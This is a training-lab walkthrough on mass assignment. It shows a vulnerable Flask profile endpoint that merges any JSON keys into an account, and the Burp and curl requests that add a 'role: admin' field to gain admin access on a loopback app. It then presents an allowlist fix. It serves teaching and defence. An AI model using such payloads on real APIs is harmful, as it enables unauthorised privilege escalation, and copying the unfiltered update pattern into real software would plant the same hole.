# Walkthrough — mass-assignment

The app has a profile-update endpoint: you send a JSON body with your account fields — `POST /profile` with `{"name": "...", "email": "..."}` — and it saves them. On success it copies the fields you sent onto your account and returns the updated account. The problem: it copies *whatever* keys the JSON carries, not just `name` and `email`. Add `"role": "admin"` — a field the profile form never offered — and it lands on your account too, making you an admin. The proof is server-side and sits in two responses: `GET /profile` starts reporting `role: admin`, and `GET /admin`, a `403` a moment ago, starts answering `200`. Everything here is done in Burp (or `curl`); there is no browser step, because the escalation is decided on the server and visible on the wire.

## 1. Context

The `vulnerable` app is on `127.0.0.1:8025` and the `fixed` app on `127.0.0.1:8125`; there is no database and no second service — the account lives in a Python dict inside the process. There is one demo account, and it *is* you, the logged-in user. It starts as `{"name": "Demo User", "email": "demo@example.com", "role": "user"}`. Three endpoints:

- `POST /profile` — updates the account from a JSON body. **This is where the bug lives.**
- `GET /profile` — returns the account's fields (`name`, `email`, `role`) — your proof.
- `GET /admin` — an admin-only view: `200` if the account's `role` is `admin`, `403` otherwise — the escalation made concrete.

This is **mass assignment**: the app binds the fields of a request onto an object in bulk, without deciding which fields the user is allowed to set (also called *object injection* or *autobinding*). Terms used below:

- **allowlist of fields**: the explicit set of fields the server lets the client set — here, `name` and `email`.
- **privileged / sensitive field**: a field that grants privilege or crosses a trust boundary if the user sets it — `role`, `is_admin`, `is_staff`, `verified`, `credits`. Only the server should ever set these.
- **privilege escalation**: gaining a higher privilege than you were assigned. Here it is *vertical* — a normal `user` becoming an `admin` — as opposed to *horizontal*, reading a same-level user's data.
- **ORM** (Object-Relational Mapping): a library that maps objects to database rows/columns — the setting where mass assignment is most notorious. This atom uses a bare dict instead (see [`DIFF.md`](./DIFF.md)).

This is **A01 — Broken Access Control**. (CWE — Common Weakness Enumeration — is the standard catalog of weakness classes.) Mass assignment's entry is **CWE-915**, "Improperly Controlled Modification of Dynamically-Determined Object Attributes"; its parent, **CWE-913**, is one of the CWEs OWASP maps to A01:2021. The exploration is done entirely in Burp; `curl` is the equivalent — there is no browser track (this atom is API-only).

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The vulnerable handler is short:

```python
@app.route("/profile", methods=["POST"])
def update_profile():
    data = request.get_json(silent=True) or {}
    # VULNERABLE: copy EVERY field from the client's JSON straight into the account ...
    account.update(data)
    return jsonify(account)
```

`account.update(data)` merges *every* key of the parsed JSON into the account dict. `data` is whatever the client sent — nothing restricts it to `name` and `email`. Audit question: *does this update pick which fields the client may set, or does it apply them all?* — it applies them all. The form only ever offered `name` and `email`, so the developer assumes only those arrive; but nothing in the code enforces that assumption. The fix (foreshadowed): let the **server** name the fields it will accept — an allowlist — instead of copying the input wholesale.

Like the sibling A01 atoms, this bug doesn't `grep`: there's no `eval`, `|safe`, or `f"` to search for. You find it by reading each handler that writes to an object and asking "which fields can the client actually set here?"

## 3. Exploitation via Burp Suite

Point Burp at the vulnerable API on `127.0.0.1:8025` and work from Repeater. Every request below is a block you paste into Repeater; the same requests run under `curl`. One thing to hold onto: the `POST /profile` requests must carry `Content-Type: application/json` — that header is what makes Flask parse the body as JSON. Without it, the body is ignored and nothing updates.

### Baseline — the feature working

Read the account as it starts:

```
GET /profile HTTP/1.1
Host: 127.0.0.1:8025
```

Response — `200`:

```json
{"email":"demo@example.com","name":"Demo User","role":"user"}
```

You are a normal `user`. Confirm the admin view is closed to you:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8025
```

Response — `403 FORBIDDEN` (Flask's default forbidden page). Now do a **legitimate** profile update — change your name and email:

```
POST /profile HTTP/1.1
Host: 127.0.0.1:8025
Content-Type: application/json

{"name": "New Name", "email": "new@example.com"}
```

Response — `200`, the updated account, `role` untouched:

```json
{"email":"new@example.com","name":"New Name","role":"user"}
```

The equivalent with curl:

```bash
curl -i http://127.0.0.1:8025/profile -H 'Content-Type: application/json' \
  -d '{"name": "New Name", "email": "new@example.com"}'
```

The feature does what it promises: `name` and `email` change, `role` stays `user`. From here on, only one thing changes — the JSON gains one extra key.

### Step 1 — Add the privileged field (the attack)

The profile form offered `name` and `email`. Add a third key it never offered — `role` — and set it to `admin`:

```
POST /profile HTTP/1.1
Host: 127.0.0.1:8025
Content-Type: application/json

{"name": "New Name", "email": "new@example.com", "role": "admin"}
```

Response — `200`, and look at the last field:

```json
{"email":"new@example.com","name":"New Name","role":"admin"}
```

`account.update(data)` copied `role` in along with `name` and `email`. curl:

```bash
curl -i http://127.0.0.1:8025/profile -H 'Content-Type: application/json' \
  -d '{"name": "New Name", "email": "new@example.com", "role": "admin"}'
```

### Step 2 — Confirm the escalation

Read the account back:

```
GET /profile HTTP/1.1
Host: 127.0.0.1:8025
```

Response — you are now `role: admin`:

```json
{"email":"new@example.com","name":"New Name","role":"admin"}
```

And the admin view, a `403` a minute ago:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8025
```

Response — `200`:

```json
{"message":"Admin area","note":"admin-only content"}
```

That is the mass assignment. You didn't break authentication or inject any syntax — you added one well-formed key to a JSON body the API was happy to accept, and the server wrote it onto your account. (`role: admin` and the demo admin content are benign lab values; nothing here is destructive, and it is all on loopback.)

> The account is in-memory and now stays `admin` until the container restarts, so run the baseline **before** the attack — as above — to see the `403` → `200` flip cleanly. To reset, `./atom down mass-assignment` then `./atom up mass-assignment`.

## 4. What the vuln is NOT

The exploit is just an extra field in a JSON body, so it is easy to draw the wrong lesson. Isolate the real cause:

- **It is NOT IDOR / BOLA.** You didn't read or touch *another* user's object — you wrote to **your own** account. The escalation is **vertical** (a `user` becoming an `admin`), not horizontal (reading a same-level neighbor's data). Where `bola-rest` and the IDOR atoms (`idor-numeric-id`, `idor-uuid-guessable`) are missing an *ownership* check on someone else's object, here the missing thing is *field selection* on your own object.
- **It is NOT injection.** You injected no syntax — no `' OR 1=1`, no `<script>`, no `{{7*7}}`, no `; id`. The body is perfectly well-formed JSON; you only added one more key. The extra field is **valid data**, not code. Injection is "input becomes code/structure"; this is "input writes a field it shouldn't."
- **It is NOT an auth bypass.** You didn't defeat a login or forge a session — the account is legitimately yours. The hole is the **blind assignment**: the server let you write `role`, a field only it should control.

**Proof of isolation:** send the *legitimate* update — `{"name": "New Name", "email": "new@example.com"}`, no `role` — to **both** apps, and both return `{"email":"new@example.com","name":"New Name","role":"user"}`, byte for byte. The feature is identical. Only the extra `role` field separates the two: the vulnerable app copies it, the fixed app ignores it.

The one thing it **is**: the server trusts the *shape* of the input and lets the client decide which attributes to set. The only fix is to let the **server** decide — an allowlist of fields.

## 5. Impact

**Vertical privilege escalation:** a normal `user` becomes an `admin`, and the admin-only `GET /admin` opens (`403` → `200`). That is the honest ceiling for this atom. **It is not RCE and not a server takeover** — you gained an application role, not code execution. The reason mass assignment is a named risk in the OWASP API Security Top 10 is how cheap and widespread it is: any endpoint that binds a request body onto an object without selecting fields lets a client write sensitive attributes — `role`, `is_admin`, `verified`, `credits`, or the `owner` of a record. Those are the class's reach — described here, not built.

## 6. Why the fix works

Run the chain against the fixed API on port **8125** (see [`DIFF.md`](./DIFF.md) for the change). It starts fresh — `GET /profile` shows `role: user`, `GET /admin` → `403`. Now send the **same attack payload**:

```
POST /profile HTTP/1.1
Host: 127.0.0.1:8125
Content-Type: application/json

{"name": "New Name", "email": "new@example.com", "role": "admin"}
```

Response — `200`, but look at `role`:

```json
{"email":"new@example.com","name":"New Name","role":"user"}
```

`name` and `email` updated; **`role` was ignored**. The fixed handler copies only the fields in its allowlist (`ALLOWED_FIELDS = {"name", "email"}`), so the extra `role` key falls on the floor. `GET /profile` still shows `role: user`, and `GET /admin` still returns `403`. Meanwhile the legitimate `name`/`email` update behaves exactly as it did on the vulnerable app — the feature is intact; only the off-list field is dropped.

The whole fix is the server deciding which fields may be set — an **allowlist of fields**, not a blocklist that hunts for `role`. This is the same "the server decides, not the input" lesson as `open-redirect`, where the server decides the redirect *destination*; here it decides the writable *fields*. See [`DIFF.md`](./DIFF.md) for why a blocklist loses and why an allowlist is the durable fix.
